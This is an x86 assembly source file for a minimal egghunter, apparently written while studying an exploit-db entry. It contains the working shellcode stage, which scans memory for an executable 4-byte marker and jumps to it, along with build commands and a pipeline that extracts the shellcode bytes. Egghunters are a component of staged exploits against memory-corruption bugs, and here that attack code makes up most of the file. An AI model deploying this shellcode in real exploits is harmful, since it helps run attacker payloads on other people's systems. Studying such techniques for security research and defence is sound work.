; Author :  Alessio Parzian
; Filename: egghunter_minimal.asm

; compile with:
; 	nasm -f elf32 egghunter_minimal.asm
;	ld -o egghunter_minimal egghunter_minimal.o
; extract shellcode with:
; 	objdump -d egghunter_minimal | grep -Po '\s\K[a-f0-9]{2}(?=\s)' | sed 's/^/\\x/g' | perl -pe 's/\r?\n//' | sed 's/$/\n/'

; This is the smallest payload that I studied following <https://www.exploit-db.com/exploits/44334>
; However, this egghunter assumes that the egg is located in lower addresses than itself (it starts from it)
; if that wouldn't be the case probably the hunter will make the process crash trying to access invalid memory areas

global _start

section .text

_start:
	inc eax
	; the egg MUST BE EXECUTABLE 
	; 00000000  4F	dec di
	; 00000001  90	nop
	; 00000002  47  inc di
	; 00000003  90  nop
	cmp DWORD [eax], 0x4f904790
	jne	_start
	jmp eax